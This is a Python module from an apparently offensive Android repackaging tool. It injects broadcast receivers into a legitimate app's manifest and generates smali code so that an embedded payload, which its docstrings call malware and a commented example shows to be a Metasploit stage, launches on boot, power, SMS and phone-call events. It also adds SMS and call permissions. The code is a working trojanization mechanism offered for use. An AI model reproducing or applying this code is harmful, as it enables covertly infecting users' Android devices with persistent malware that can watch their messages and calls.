from packadroid.manifestmanager import manifest_changer
from packadroid.hookmanager.hook import Hook
from collections import defaultdict
import xml.etree.ElementTree as ET


#gloab variables
receiver_count = 0
path = ""
#on_power_connected
opc = False
#on_power_disconnected
opdc = False
#on_boot_completed
obc = False
#on_receive_sms
ors = False
#on_incoming_call
oic = False
#on_outgoing_call
ooc = False


def __fix_manifest(manifest_path, package, actions):
    """
    Fixes the AndroidManifest.xml dependent on the specified hooks. Adds neede permissions. Adds needed receiver.

    :return 
    Name of the used class which catches the broadcast.
    """
    global receiver_count
    broadcast_class = "BroadcastLauncher" + str(receiver_count)
    receiver_count += 1

    print(broadcast_class)
    print(package)
    print(actions)

    # inject receiver:
    rec = ('        <receiver android:name="' + package.replace("/",".") + '.' + broadcast_class +'">\n            <intent-filter>\n').replace("..", ".")
    
    permissions = []
    for a in actions:
        if a == "on_power_connected":
            rec += '                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>\n'
        if a == "on_power_disconnected" :
            rec += '                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>\n'
        if a == "on_boot_completed":
            rec += '                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n'
            permissions.append("android.permission.RECEIVE_BOOT_COMPLETED")
        if a == "on_receive_sms":
            rec += '                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>\n'
            permissions.append("android.permission.RECEIVE_SMS")
        if  a == "on_incoming_call":
            rec += '                <action android:name="android.intent.action.PHONE_STATE"/>\n'
            permissions.append("android.permission.READ_PHONE_STATE")
        if a == "on_outgoing_call":
            rec += '                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>\n'
            permissions.append("android.permission.PROCESS_OUTGOING_CALLS")

    rec += '            </intent-filter>\n        </receiver>'

    print(rec)
    manifest_changer.add_receiver(manifest_path, rec)
    # add permissions
    manifest_changer.add_permissions_to_manifest(manifest_path, manifest_path, permissions)

    return broadcast_class


def __inject_smali(payload_apk_path, filename, package, classname, methodname):
    """
    Generates the smali code for the broadcast receiver based on given package, classname and methodname
    
    :param package: The pakcage where the broadcastreceiver is placed. It is recommended to place the broadcast receiver in the same folder as the payload, but it is not mandatory
    :type package: str

    :param classname: The class in the payload (malware) on which the static method is called
    :type classname: str

    :param hooks: The static method which is called to launch the payload (malware)
    :type hooks: str

    :return
    pass
    """

    global path
    smali = (".class public L" + package.replace(".","/") + "/" + filename + ";\n").replace("//", "/")
    # remove from line 2: .source "BroadcastLauncher.java"
    smali += """.super Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;\n"""

    # The parameter is always the context since a payload (malware does not need any other parameters of the original application)
    invoke = ("    invoke-static {p1}, L" + package + "/" + classname + ";->" + methodname + "(Landroid/content/Context;)V\n").replace("//","/")
    smali += invoke

    smali += """    .prologue
    .line 12
    return-void
.end method"""

    print(smali)
    
    # need to put the classes to the payload. packer copies it then to the original apk in the repack process
    with open(payload_apk_path + "/smali/" + package.replace(".","/") + "/" + filename + ".smali","w") as f:
        f.write(smali)

def __generate_hook(item, original_manifest_path, payload_manifest_path):
    tree = ET.parse(payload_manifest_path)
    root = tree.getroot()
    payload_package = root.attrib['package']
    filename = __fix_manifest(original_manifest_path, payload_package, item[1])
    __inject_smali(item[0][3], filename, payload_package, item[0][0], item[0][1])


def inject_broadcast_receiver_hooks(hooks, original_apk_path):
    """
    Injects different hooks into the original application. These hooks are launched on the intents given in the parameters. The broadcast hooks are generated based on a given list of object hooks
    
    :param hooks: list of hook objects
    :type hooks: list

    :return
    """
    global path, obc, opdc, opc, ors, oic, ooc


    hook_overview = defaultdict(list)
    for h in hooks:
        if h.get_type() != "broadcast_receiver":
            print("Broadcast hook got hook object which is no broadcast_receiver")
            continue
        #print(h)
        key = (h.get_class(), h.get_method(), h.get_payload_apk_path(), h.get_payload_dec_path())
        hook_overview[key].append(h.get_location())

#        hook_type = h.get_location()
#        if hook_type == "on_power_connected":
#            opc = True
#        elif hook_type == "on_power_disconnected":
#            opdc = True
#        elif hook_type == "on_boot_completed":
#            obc = True
#        elif hook_type == "on_receive_sms":
#            ors = True
#        elif hook_type == "on_incoming_call":
#            oic = True
#        elif hook_type == "on_outgoing_call":
#            ooc = True
    original_manifest_path = (original_apk_path + "/" + "AndroidManifest.xml").replace("//", "/")
    print(hook_overview.items())
    for h in hook_overview.items():
        payload_manifest_path = (h[0][3] + "/" + "AndroidManifest.xml").replace("//", "/")

        __generate_hook(h, original_manifest_path, payload_manifest_path)

    #raise Exception("Use original_apk_path to find Manifest")
    #raise Exception("Find payload package from payload apk manifest")

    #__inject_smali(package, classname, methodname)
    #__fix_manifest(manifest_path, package)
    

#def main():
#    h1 = Hook("broadcast_receiver", "on_power_connected", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
#    h2 = Hook("broadcast_receiver", "on_power_disconnected", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
#    h3 = Hook("broadcast_receiver", "on_boot_completed", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
#    h4 = Hook("broadcast_receiver", "on_outgoing_call", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
#    h5 = Hook("broadcast_receiver", "on_receive_sms", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
#    h6 = Hook("broadcast_receiver", "on_incoming_call", "Payload", "start", "original/_decompiled/smali/com/metasploit/stage/")
#
#    inject_broadcast_hooks([h1,h2,h3,h4,h5,h6])
#
#main()